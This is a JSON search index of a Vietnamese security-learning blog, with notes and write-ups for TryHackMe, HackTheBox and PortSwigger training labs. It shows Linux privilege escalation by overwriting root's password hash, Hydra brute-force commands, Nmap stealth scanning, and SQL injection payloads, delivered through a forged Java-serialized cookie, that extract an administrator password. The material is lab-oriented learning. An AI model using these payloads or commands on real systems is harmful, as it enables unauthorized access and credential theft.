thì đi crack còn nếu có thêm quyền sửa thì chúng ta chỉ cần hash một cái pass mới rồi thay thể vào hash của pass cũ là xong. Điều quan trọng là phải biết cái hash đó dùng thuật toán gì.(Như trong bài là sha-512)\nĐem ra so sánh thì việc crack password khó hơn nhiều so với việc xác định thật toán của hàm hash. Để xác định được thuật toán hash chúng ta có thể sử dụng một số tool như hash-identifier, hashid,\u0026hellip; hoặc một số tool online như hash-analyzer\nSau khi xác định được thuật toán hash thì các bạn có thể dùng lệnh sau để tạo ra chuỗi hash:\n mkpasswd -m hash_type newpasswordhere \n Cuối cùng là thay thế đoạn hash của root user trong /etc/shadow thành đoạn hash vừa tạo để cập nhật pass mới cho root.\nTask 5: Weak File Permissions - Writable /etc/passwd Ngoài file như đã nói ở task 3,4 thì còn một file nữa là /etc/passwd  cũng lưu hash của password. Tuy nhiên có một số máy không lưu ở file này. Và thường thì nó không lưu ở file này.\nViệc cần làm vẫn là loanh quanh như ở task 3 và 4. Đặc biệt, ở task này học được thêm một cách để tạo hash là:\n openssl passwd newpasswordhere \n Có một lưu ý là cái hash trong file này được lưu ở giữa dấu : thứ 1 và 2 và thường thì ở đấy nó để chữ x nhé!\nTask 6: [Đang cập nhật\u0026hellip;.]\n","description":"Cơ bản về nâng cấp đặc quyền trên Linux - Tryhackme Room","id":9,"section":"posts","tags":["Linux","Tryhackme",""],"title":"Linux PrivEsc","uri":"https://ch1nhpd.github.io/posts/linux-privesc/"},{"content":"Hai cái tool là Nikto và Zap.\nCả hai đều sử dụng để tìm kiểm những điểm yếu trang web.\nSublist3r: tìm ra các subdomain dựa vào các công cụ tìm kiếm như bing, gg, baidu,\u0026hellip;\nNgoài ra có một trang web để làm công việc tương tự\nHydra\nLà một cái tool để brute force password một số dịch vụ như ftp,ssh,webapp form,\u0026hellip;\nVD1: web app form\nhydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.229.24 http-post-form \u0026quot;/login:username=^USER^\u0026amp;password=^PASS^:Your username or password is incorrect.\u0026quot; -V\nVD2: ssh\nhydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.229.24 -t 4 ssh\n","description":"Note","id":10,"section":"notes","tags":["","",""],"title":"Web Scanning, Sublist3r, Hydra - TryHackMe","uri":"https://ch1nhpd.github.io/notes/roomwebscanning/"},{"content":"Giới thiệu Trước khi đến vơi Nmap thì chúng ta cần tìm hiểu về một khái niệm khác đó chính là port. Hẳn là bạn đã từng truy cập vào nhiều trang web cùng một lúc như vừa nhắn tin fb vừa nhắn tin telegram và bạn đã bao giờ tự hỏi tại sao tin nhắn đến từ fb lại ko nhảy sang telegram?\nTất nhiên là không thể nhảy lộn xộn như vậy được rồi vì mỗi khi gửi đi một request thì nó sẽ tự động mở một port để đánh dấu để khi response tương ứng sẽ vào đúng port đấy luôn. Và trên mỗi máy tính có đến 65535 (2^16) port trong đó có một số port được định nghĩa sẵn như:\n 80: http, 443: https, 21: ftp, 22: ssh, 23: telnet, \u0026hellip;.\n Còn chức năng chính của Nmap là xác định xem những port nào đang được mở để chúng ta có thể dễ dàng khai thác. Ngoài ra qua những đoạn scripts có sẵn của Nmap, chúng ta có thể dễ dàng tìm kiếm lỗ hỏng hoặc thậm chí là khai thác trực tiếp. Cùng nhau tìm hiểu tiếp qua các phần bên dưới nhé!\nCác kiểu Scan TCP connect Scans -sT Để hiểu được TCP connect scans, ta cần hiểu được quá trình bắt tay ba bước (three-way handshake) trong giao thức TCP.\n  Đầu tiên khi ta gửi một TCP request tới máy chủ mục tiêu với gói SYN.\n  Sau đó máy chủ xác nhận gói tin này với một phản hồi TCp có chứ SYN flag và ACK flag.\n  Cuối cùng, để hoàn thành quá trình bắt tay ba bước, máy của ta gủi một TCP request nữa tới server với ACK flag mà mình đã nhận.\n  TCP scan hoạt động bằng cách gửi TCP request với SYN flag tới mỗi port mình muốn của server và quan sát cách server phản hồi lại để xác định tình trạng đóng mở của port đó.\nNếu nhận được như trong bước hai của three-way handshake thì chứng tỏ port đó đang mở.\nCòn nếu nhận được RST(Reset) flag thì port đó đang đóng.\nTuy nhiên có một trường hợp đặc biệt xảy ra là ta không nhận được gì hết. Nguyên nhân là do các cổng đó đang được bảo vệ bởi tường lửa của đối phương. Việc cấu hình nên tường lửa như vậy thì cực kì đơn giản nhưng lại khiến ta rất khó có thể xác định chính xác mục tiêu. Đó được coi là một nhược điểm của TCP connect Scans.\nTrong trường hợp đó Nmap xác định port đó đang ở trạng thái filltered.\nSYN Scans -sS Giống như TCP Scans, SYN Scans cũng được dùng để scan TCP port. Chỉ có một chút khác biệt là ở bước 3, thay vì gửi ACK flag lại cho server thì SYN Scan lại gửi gói tin RST.\nViệc gửi RST thay vì ACK là vô cùng có lợi khi đứng ở vai trò là kẻ tấn công. Điều này giúp hacker có thể bypass được một số hệ thống phát hiện xâm nhập đời cũ bởi những hệ thống đó chỉ phát hiện khi quá trình bắt tay ba bước hoàn tất (như đã nói ở TCP Scans).\nKhông chỉ vậy, SYN Scans thường không được ghi nhật kí bởi các ứng dụng đang lắng nghe trên port đang mở, vì thông thường nó chỉ ghi lại kết quả khi kết nối được thiết lập đầy đủ(hoàn thành quá trình bắt tay 3 bước). Và như vậy SYN Scans thường được gọi là stealthy hay Half-open\nVì không cần bận tâm về việc hoàn thành và ngắt kết nối nên SYN Scans nhanh hơn đáng kể so với TCP Scans.\n Lưu ý\n- Khi dùng SYN Scans, chúng ta cần chạy dưới quyền sudo. Và SYN Scans cũng chính là kiểu mặc định khi ta chạy Nmap dưới quyền sudo.\n- Nếu không chạy sudo thì mặc định sẽ là TCP Scans\n UDP Scans -sU Đang cập nhật \u0026hellip;\nBài viết dựa trên: tryhackme Room\n","description":"Nmap cơ bản","id":11,"section":"posts","tags":["","",""],"title":"Nmap","uri":"https://ch1nhpd.github.io/posts/nmap/"},{"content":"TMUX\nLà một cái tool để sử dụng terminal một cách hiệu quả hơn. Một trong số chức năng tuyệt vời của nó là để khôi phục lại session trước đó. VD: khi đang ssh đến server mà bị mất mạng thì khi ssh lại nó sẽ khôi phục lại đúng cái lúc mình bị đá ra..\n","description":"note","id":12,"section":"notes","tags":["","",""],"title":"Note  Tmux","uri":"https://ch1nhpd.github.io/notes/tmux/"},{"content":"chuỗi \r--\rHack The Box Linux  October OpenAdmin Canape CronOS FriendZone Frolic Haircut Help Jarvis Joker Lame Nibbles Nineveh Poison RedCross Sunday  Windows  Netmon Jerry Devel Blue Bounty Optimum  VulnHub  Bob Brainpan GoldenEye NullByte Pluck Sedna  TryHackMe  Alfred Blue Brainstorm Corp HackPark Ignite Kenobi Skynet Steel Mountain Thompson  Bonus by TJNull (HTB)   Sniper\n  Conceal\n  Tally\n  Bankrobber — difficult but you’ll be able to practice with a specific exploitation which is VERY common in penetration testing world and which you won’t be able to get practice about, as far as I know, any other machine on HTB.\n  Active\n  SolidState\n  Fortune — quite more difficult and not in the list of TJNull but I’d add it. It gets you involved in many techniques that you will practice on OSCP.\n  Brainfuck —Only until you get a shell as user. Privesc is sick and not OSCP at all.\n  Bart\n  And here a bonus with some other boxes not much OSCP-like but that I also consider a must since you will exploit different kind of technologies widely used nowadays (some might also be involved in OSCP but their exploitation may not be the same):\n  Craft\n  Mango *\n  Forest *\n  Registry\n  Silo *\n  Monteverde\n  ","description":"tryhackme, hackthebox, vulnhub","id":13,"section":"posts","tags":["","",""],"title":"List lab OSCP","uri":"https://ch1nhpd.github.io/posts/lab-thm-htb-vulnhub/"},{"content":"Zoom này cho mình một cái ảnh, xong bắt mình tìm thông tin liên quan đến cái ảnh đó.\nĐầu tiên dùng exiftool tìm được chủ sở hữu của nó.\nTiếp theo tìm các thông tin liên quan đến người đó.\nCó web wigle.net giúp định vị, tìm thông tin liên quan đến bssid.\nNgoài ra còn biết thêm là khi view source thì ko chỉ để ý đến comment mà còn có cả những chỗ set màu trùng với background.\n","description":"Lý thuyết.","id":14,"section":"notes","tags":["","","TryHackMe"],"title":"OhSINT","uri":"https://ch1nhpd.github.io/notes/ohsint/"},{"content":"Part 1 - Intro  ✅ OpenVPN https://tryhackme.com/room/openvpn ✅ Welcome https://tryhackme.com/jr/welcome ✅ Intro to Researching https://tryhackme.com/room/introtoresearch ✅ The Hacker Methodology https://tryhackme.com/room/hackermethodology ✅ Learn Linux https://tryhackme.com/module/linux-fundamentals ✅ Crash Course Pentesting https://tryhackme.com/room/ccpentesting  Introductory CTFs to get your feet wet  ✅ Google Dorking https://tryhackme.com/room/googledorking ✅ OHsint https://tryhackme.com/room/ohsint ✅ Shodan.io https://tryhackme.com/room/shodan  Part 2 - Tooling  ✅ Tmux https://tryhackme.com/room/rptmux ✅ Nmap https://tryhackme.com/room/furthernmap ✅ Web Scanning https://tryhackme.com/room/rpwebscanning ✅ Sublist3r https://tryhackme.com/room/rpsublist3r [⏳] Metasploit https://tryhackme.com/room/rpmetasploit ✅ Hydra https://tryhackme.com/room/hydra ✅ Linux Privesc https://tryhackme.com/room/linuxprivesc ✅ RustScan (I invented RustScan so excuse the self-promo) https://tryhackme.com/room/rustscan  More introductory CTFs  ✅ Vulnversity - https://tryhackme.com/room/vulnversity [⏳] Blue - https://tryhackme.com/room/blue ✅ Simple CTF https://tryhackme.com/room/easyctf ✅ Bounty Hacker https://tryhackme.com/room/cowboyhacker Brute It https://tryhackme.com/room/bruteit  Part 3 - Crypto \u0026amp; Hashes with CTF practice  ✅ Crack the hash https://tryhackme.com/room/crackthehash ✅ Agent Sudo https://tryhackme.com/room/agentsudoctf [⏳] The Cod Caper https://tryhackme.com/room/thecodcaper Ice https://tryhackme.com/room/ice [⏳] Lazy Admin https://tryhackme.com/room/lazyadmin ✅ Basic Pentesting https://tryhackme.com/room/basicpentestingjt  Part 4 - Web  ✅ OWASP top 10 https://tryhackme.com/room/owasptop10 ✅ Injection https://tryhackme.com/room/sqlinjectionlm ✅ Injection https://tryhackme.com/room/injection ✅ Juiceshop https://tryhackme.com/room/owaspjuiceshop ✅ Ignite https://tryhackme.com/room/ignite ✅ Year of the Rabbit https://tryhackme.com/room/yearoftherabbit  Part 5 - Reverse Engineering  ✅ Intro to x86 64 https://tryhackme.com/room/introtox8664 ✅ CC Ghidra https://tryhackme.com/room/ccghidra ✅ CC Radare2 https://tryhackme.com/room/ccradare2 ✅ CC Steganography https://tryhackme.com/room/ccstego ✅ Reverse Engineering https://tryhackme.com/room/reverseengineering ✅ Reversing ELF https://tryhackme.com/room/reverselfiles ✅ Dumping Router Firmware https://tryhackme.com/room/rfirmware  Part 6 - Networking  ✅ Introduction to Networking https://tryhackme.com/room/introtonetworking ✅ Smag Grotto https://tryhackme.com/room/smaggrotto ✅ Overpass 2 https://tryhackme.com/room/overpass2hacked ✅ Nmap 01 https://tryhackme.com/room/nmap01  Part 7 - PrivEsc  ✅ Sudo Security Bypass https://tryhackme.com/room/sudovulnsbypass ✅ Sudo Buffer Overflow https://tryhackme.com/room/sudovulnsbof [⏳] Windows Privesc Arena https://tryhackme.com/room/windowsprivescarena Linux Privesc Arena https://tryhackme.com/room/linuxprivescarena [⏳] Windows Privesc https://tryhackme.com/room/windows10privesc Blaster https://tryhackme.com/room/blaster ✅ Kenobi https://tryhackme.com/room/kenobi Capture the flag https://tryhackme.com/room/c4ptur3th3fl4g Pickle Rick https://tryhackme.com/room/picklerick  Part 8 - Windows  ✅ Attacktive Directory https://tryhackme.com/room/attacktivedirectory Retro https://tryhackme.com/room/retro Blue Print https://tryhackme.com/room/blueprint Anthem https://tryhackme.com/room/anthem Relevant https://tryhackme.com/room/relevant  Part 9 - CTF practice  DevelPy https://tryhackme.com/room/bsidesgtdevelpy Jack of all trades https://tryhackme.com/room/jackofalltrades Bolt https://tryhackme.com/room/bolt Post Exploitation Basics https://tryhackme.com/room/postexploit Inclusion https://tryhackme.com/room/inclusion Dogcat https://tryhackme.com/room/dogcat LFI basics https://tryhackme.com/room/lfibasics Buffer Overflow Prep https://tryhackme.com/room/bufferoverflowprep Overpass https://tryhackme.com/room/overpass Break out the cage https://tryhackme.com/room/breakoutthecage1 Lian Yu https://tryhackme.com/room/lianyu  📌My Profile \r.\nnguồn: anonyviet.com\n  ","description":"Các phòng lộ trình miễn phí và cực kỳ thú vị TryHackMe, từ không biết gì thành người có kiến thức và kỹ năng ở mức trung bình.","id":15,"section":"posts","tags":["tryhackme"],"title":"TryHackMe list room from beginer","uri":"https://ch1nhpd.github.io/posts/try-hack-me-list-room/"},{"content":"Server-side template injection là gì? ⏳\n  ","description":"Lý thuyết.","id":16,"section":"notes","tags":["web","Server-side template injection","PortSwigger Academy"],"title":"Server-side template injection","uri":"https://ch1nhpd.github.io/notes/server-side-template-injection/"},{"content":"chuỗi \r--\rhttps://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery\n","description":"SSRF","id":17,"section":"posts","tags":["SSRF","",""],"title":"Server-site request forgery","uri":"https://ch1nhpd.github.io/posts/ssrf/"},{"content":"Xin chào các bạn, hôm nay mình sẽ nói về một bài lab trên Web Security Academy. Bài này được họ đánh giá ở mức độ Expert nên khá là dài nhưng không khó lắm đâu nhé! Cá bạn có thể thực hành ngay tại đây.\nCùng bắt đầu ngay nhé Đầu tiên hãy bật Burp Suite lên, kết nối vào bài lab và đăng nhập vào tài khoản được cấp. Khi bạn dùng Burp để xem request đến /my-account các bạn sẽ thấy cookie của mình giống như hình dưới đây:\nBây giờ thử decode nó bằng tab decoder trong Burp nhé\nĐọc tiêu đề bài lab thì chúng ta có thể biết nó là Java deserialization nhưng nếu gặp thực tế thì chúng ta nhận biết thế nào? Hãy nhìn vào chỗ mình tô màu vàng trong decode nhé. Đoạn data.session.token.AccessTokenUser như kiểu đường dẫn của một class vậy, còn chữ java/lang kia nữa. Đó được coi là một trong những dấu hiệu giúp chúng ta nhận ra nhé.\nDiscover content Tiếp theo, sau khi discover content trang web mình thu được kết quả như ảnh dưới đây.\nChúng ta có thể nhìn thấy trang web để lộ hai file java. Hãy truy cập đến hai file đó ngay thôi nào..\nỞ file AccessTokenUser.java ta thấy class được implements Serializable. Và trùng hợp là cái tên class này có trong cái cookie mà chúng ta đã decode lúc nãy. Qua đây chúng ta có thể đoán được là khi server nhận cookie sẽ thực hiện deserializable để nhận được đối tượng.Rồi cứ để đó đã, chúng ta xem tiếp file còn lại có gì nào. À quên, các bạn có thể đọc về Serializable và deserializable tại đây nhé\nNhư các bạn thấy, class này cũng được implements từ Serializable, nghĩa là cũng có thể biến đổi từ object sang dạng byte stream. Nhưng class này chỉ biến đổi thuộc tính id vì Product đã được thêm transient. Để ý tiếp xuống dưới thì ta thấy hàm readObject có thực hiện một câu sql với đối số truyền vào là id.\nQua hai class thì chúng ta hãy thử tưởng tượng xem sẽ như thế nào nếu cái cookie không phải là đối tượng thuộc class 1 mà lại là đối tượng thuộc class 2 nhỉ. Liệu có thể có SQLi\u0026hellip;\nDeveloping a custom gadget chain Rồi, bây giờ chúng ta thử tạo class giống class 2 sau đó thực hiện biến đổi đối tượng sang dạng byte stream rồi encode dưới dạng Base64 để tạo ra một cookie giả nhé. Do sa chân lỡ bước mình đã không may va vào code của họ :))\nCác bạn cần chú ý hàm Main dưới đây nhé.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  import data.productcatalog.ProductTemplate; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; import java.util.Base64; class Main { public static void main(String[] args) throws Exception { ProductTemplate originalObject = new ProductTemplate(\u0026#34;gõ payload vào đây nhé - cái mà nó sẽ thay chỗ của id ấy\u0026#34;); String serializedObject = serialize(originalObject); System.out.println(\u0026#34;Serialized object: \u0026#34; + serializedObject); ProductTemplate deserializedObject = deserialize(serializedObject); System.out.println(\u0026#34;Deserialized object ID: \u0026#34; + deserializedObject.getId()); } private static String serialize(Serializable obj) throws Exception { ByteArrayOutputStream baos = new ByteArrayOutputStream(512); try (ObjectOutputStream out = new ObjectOutputStream(baos)) { out.writeObject(obj); } return Base64.getEncoder().encodeToString(baos.toByteArray()); } private static \u0026lt;T\u0026gt; T deserialize(String base64SerializedObj) throws Exception { try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) T obj = (T) in.readObject(); return obj; } } }   và class TemplateProduct có dạng\nSQLi Đầu tiên, mình thêm một dấu nháy đơn vào chỗ payload và chạy code sau đó sửa cookie gốc bằng kết quả code vừa chạy.\nVà đây là kết quả\nOke thế là bài toán bây giờ chính thức chuyển thành SQLi.\nMình đã thử và có vẻ chèn bất kì câu sql nào vào đều có thể chạy được. Vậy là dễ rồi, hãy xem mình làm tiếp thế nào nhé\u0026hellip;\nXác định số cột Mình dùng UNION vì vậy bước đầu tiên chính là xác định xem câu truy vấn gốc lấy ra bao nhiêu cột. Để xác định được thì các bạn cứ , null tiếp vào payload dưới đây của mình cho đến khi đúng thì thôi. Khi đấy số lượng từ null chính là số cột của câu truy vấn gốc.\n ' UNION SELECT null, null, null\n Xác định kiểu dữ liệu từng cột Để xác định kiểu dữ liệu của từng cột, chúng ta lại thay null bằng một ví dụ của kiểu dữ liệu đó. Vd nếu muốn biết có phải integer không thì các bạn thay null = 1 hoặc string thì thay null = 'a' .Nếu không có lỗi gì xảy ra thì đúng là cái kiểu dữ liệu bạn đã thử hoặc có trường hợp có lỗi nó cũng báo luôn kiểu dữ liệu của cột đó như thế này\nTìm tên cột tên bảng Trong sql thường có một bảng tổng tên là information_schema.tables có cột table_name lưu tên tất cả các bảng trong cơ sở dữ liệu. Các bạn có thể tìm kiểm information schema + tên hệ quả trị CSDL để biết thêm. Còn đây là payload tiếp theo của mình\n ' UNION SELECT null, null, null, table_name, null, null, null, null FROM information_schema.tables--\n Tuy nhiên nó bị hiện lỗi như sau\nNghĩa là ở câu truy vấn gốc kiểu dữ liệu là integer nhưng câu sau UNION lại là character. Tiếp theo mình đã dùng hàm CAST() để ép kiểu từ character thành integer.\n ' UNION SELECT null, null, null, CAST(table_name as integer), null, null, null, null FROM information_schema.tables--\n Sở dĩ dùng hàm CAST() vì chắc chắn nó sẽ bị lỗi nếu đầu ra của table_name chứa một kí tự không phải số. Và một điều nữa là khi có lỗi thì nó sẽ hiện cái lỗi đấy ra và chúng ta sẽ đọc được như thế này.\nRồi sau khi có tên bảng ta tiếp tục tìm tên cột chứa password bằng payload sau\n ' UNION SELECT null, null, null, CAST(column_name as integer), null, null, null, null FROM information_schema.columns WHERE table_name = 'users' --\n Tuy nhiên nó không hiện ngay cái bảng chúng ta cần tìm, chúng ta lại tiếp tục sửa payload\n ' UNION SELECT null, null, null, CAST(column_name as integer), null, null, null, null FROM information_schema.columns WHERE table_name = 'users' AND column_name != 'username'--\n Tìm thông tin tiếp Cuối cùng là tìm đến mật khẩu của Administrator thôi\n' UNION SELECT null, null, null, CAST(password as integer), null, null, null, null FROM users WHERE username LIKE \u0026lsquo;%admin%\u0026rsquo; \u0026ndash;\nVà đây là kết quả\nTổng kết Như vậy là chúng ta đã đi qua một bài lab dài thật là dài. Hãy cùng xem lại những kiến thức vừa đi qua nhé\n Discover content. Serializable \u0026gt;\u0026lt; Deserializable. SQL Injection, cách tìm ra lần lượt các thành phần trong cơ sở dữ liệu.  ","description":"Insecure deserialization exploiting - Web Security Academy - PortSwigger.","id":18,"section":"posts","tags":["web","Insecure deserialization","PortSwigger Academy"],"title":"LAB  Developing a custom gadget chain for Java deserialization","uri":"https://ch1nhpd.github.io/posts/developing-a-custom-gadget-chain-for-java-deserialization/"},{"content":"Xin chào, hôm nay chúng ta cùng đến với một Challenge về mảng Web trên Hackthebox nhé!\nReady!! Đây là giao diện của trang web khi mình bắt đầu truy cập.\nQua đây cộng với phần mô tả của challenge thì chúng ta có thể biết việc của mình là phải encript chuỗi r4q6q5pBOCNyWXcqV0EHbằng thuật toán MD5.\nMình đã thử encript sau đó submit nhưng kết quả nhận được là to slow!.\nVì vậy phải có một cách khác nhanh hơn chính là viết script để tự động hóa việc submit. Các bạn sẽ có rất nhiều cách để viết scritp và ở đây mình dùng python:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import requests import hashlib url = \u0026#39;http://142.93.44.199:31032\u0026#39; r = requests.session() rp = r.get(url).text x = rp.split(\u0026#34;\u0026lt;h3 align=\u0026#39;center\u0026#39;\u0026gt;\u0026#34;)[1] string = x.split(\u0026#39;\u0026lt;\u0026#39;)[0] h = hashlib.md5(string.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() data={\u0026#39;hash\u0026#39;: h} response=r.post(url = url, data = data) print(response.text)   Phân tích code  Đầu tiên mình tạo một request tới trang web kia.Và đây là kết quả của biến rp (Sau khi code chạy xong dòng 7)\n1 2 3 4 5 6 7 8 9 10 11 12  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;emdee five for life\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body style=\u0026#34;background-color:powderblue;\u0026#34;\u0026gt; \u0026lt;h1 align=\u0026#39;center\u0026#39;\u0026gt;MD5 encrypt this string\u0026lt;/h1\u0026gt;\u0026lt;h3 align=\u0026#39;center\u0026#39;\u0026gt;zguJrmZCRFfHNNnR5clq\u0026lt;/h3\u0026gt;\u0026lt;center\u0026gt;\u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;hash\u0026#34; placeholder=\u0026#34;MD5\u0026#34; align=\u0026#39;center\u0026#39;\u0026gt;\u0026lt;/input\u0026gt; \u0026lt;/br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt;\u0026lt;/input\u0026gt; \u0026lt;/form\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Việc tiếp theo là phải cắt được đoạn string (trong trường hợp này là: zguJrmZCRFfHNNnR5clq ) để mã hóa rồi submit. Có rất nhiều cách để có thể cắt được chuỗi đó. Và ở đây mình dùng thấy chỉ có một \u0026lt;h3 align='center'\u0026gt; nên nếu mình dùng hàm split thì sẽ cắt được đoạn html thành hai hai phần.  Kết quả của hàm split trong trường hợp này một cái mảng gồm hai phần tử (bên trái và bên phải của \u0026lt;h3 align='center'\u0026gt;)\n  Khi đó ta thấy chuỗi cần lấy ra nằm ở ngay đầu phần tử thứ [1] của mảng. Tiếp tục căt phần tử ấy theo \u0026lt; thì ta được chuỗi đó nằm ở vị trí [0] của mảng lần này. (Dòng 9) Sau đó ta thực hiện mã hóa chuỗi bằng thuật toán MD5 (Dòng 11) Để gửi được đi thì ta phải chuẩn hóa nó theo dạng cấu trúc như dòng thứ 12. Chữ hash là giá trị của biến name của thẻ input trong đoạn html của biến rp. Cuối cùng là post lên để nhận flag.  Note Có thể bạn chạy code lần đầu sẽ không thấy flag. Nguyên nhân là do dán MD5 vào vẫn chậm hơn yêu cầu bài toán. Bạn có thể khắc phục bằng cách tối ưu đoạn code hoặc sử dụng ngôn ngữ khác với những thuật toán nhanh hơn. Còn không thì chạy lại vài lần và đây là kết quả:\nTổng kết  Sử dụng hàm split để cắt chuỗi. Sử dụng thư viện requests để kết nối, gửi nhận dữ liệu. Sử dụng thư viện hashlib để mã hóa thông tin.\nNgoài ra có thể mã hóa MD5 ở đây  ","description":"Challenge web - HACK THE BOX.","id":19,"section":"posts","tags":["web","hackthebox","challenge"],"title":"Emdee five for life writeup HACK THE BOX","uri":"https://ch1nhpd.github.io/posts/emdee-five-for-life-writeup-hackthebox/"},{"content":"photo\nLearn more and contribute on GitHub.\n","description":"Hugo, the world’s fastest framework for building websites","id":20,"section":"","tags":null,"title":"About","uri":"https://ch1nhpd.github.io/about/"}]